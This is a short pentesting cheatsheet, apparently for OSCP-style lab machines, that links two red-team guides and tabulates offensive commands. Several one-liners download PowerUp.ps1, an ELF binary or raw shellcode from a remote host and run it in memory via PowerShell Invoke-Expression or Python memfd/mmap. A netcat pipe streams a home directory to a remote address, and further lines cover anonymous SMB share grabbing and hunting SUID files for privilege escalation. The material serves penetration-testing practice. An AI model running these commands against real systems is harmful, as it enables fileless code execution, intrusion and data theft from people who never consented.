# Pentesting
**Pentesting Commands**



## Guides
https://web.archive.org/web/20221126165225/https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#enumeration

https://paper.bobylive.com/Security/The_Red_Team_Guide_by_Peerlyst_community.pdf
- [Cheatsheet](#cheatsheet)  

---

## Cheatsheet 

<table>
  <tr>
    <td>Download Anonymous SMB Share</td>
    <td>
      <pre><code>smbclient \\\\10.10.10.10\\share -p 445 -N -Tc share.tar
tar xf share.tar -C share</code></pre>
    </td>
  </tr>
  <tr>
    <td>ngrep can give good info on protocol versions</td>
    <td>
      <pre><code>sudo ngrep -i -d <network interface> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
    </td>
  </tr>
  <tr>
    <td>PowerUp in Memory (CMD)</td>
    <td>
      <pre><code>echo Invoke-Expression(New-Object Net.WebClient).downloadString('http://10.10.10.10/PowerUp.ps1') | powershell -noprofile -</code></pre>
    </td>
  </tr>
  <tr>
    <td>PowerUp in Memory (PowerShell)</td>
    <td>
      <pre><code>Invoke-RestMethod('http://10.10.10.10/PowerUp.ps1') | Invoke-Expression</code></pre>
    </td>
  </tr>
  <tr>
    <td>Python3 ELF In-Memory (No Params)</td>
    <td>
      <pre><code>python3.7 -c 'import os, urllib.request; d=urllib.request.urlopen("http://10.10.0.103/test.exe"); fd=os.memfd_create("foo"); os.write(fd,d.read()); p=f"/proc/self/fd/{fd}"; os.execve(p, [p], {})'</code></pre>
    </td>
  </tr>
  <tr>
    <td>Python3 ELF In-Memory (With Params)</td>
    <td>
      <pre><code>python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("foo"); os.write(fd, d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p,"-Pn", "-n", "127.0.0.1"], {})'</code></pre>
    </td>
  </tr>
  <tr>
    <td>Python3 Shellcode Execution</td>
    <td>
      <pre><code>/usr/bin/python3 -c 'import urllib.request,mmap,ctypes;d = urllib.request.urlopen("http://10.10.10.10/a").read();m=mmap.mmap(-1,len(d),34,7);m.write(d);ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()'</code></pre>
    </td>
  </tr>
  <tr>
    <td>Transfer folder Linux </td>
    <td>
      <pre><code>nc -l -p 1234 | tar xf -
tar cf - /home/debian | nc 10.10.10.10 1234</code></pre>
    </td>
  </tr>
  <tr>
    <td>Enumerate SUIDs - Easy Linux Machines</td>
    <td>
      <pre><code>find / -type f 2>/dev/null -exec stat -c "%A %n" {} + | grep '^...s'</code></pre>
    </td>
  </tr>
    <tr>
    <td>Machine creators will usually make the priv esc last. Check for all file changes before the release date of the Linux VM.</td>
    <td>
      <pre><code>find -L / -type f -newerct "2020-12-01" ! -newerct "2020-12-21" 2>/dev/null</code></pre>
    </td>
  </tr>
</table>
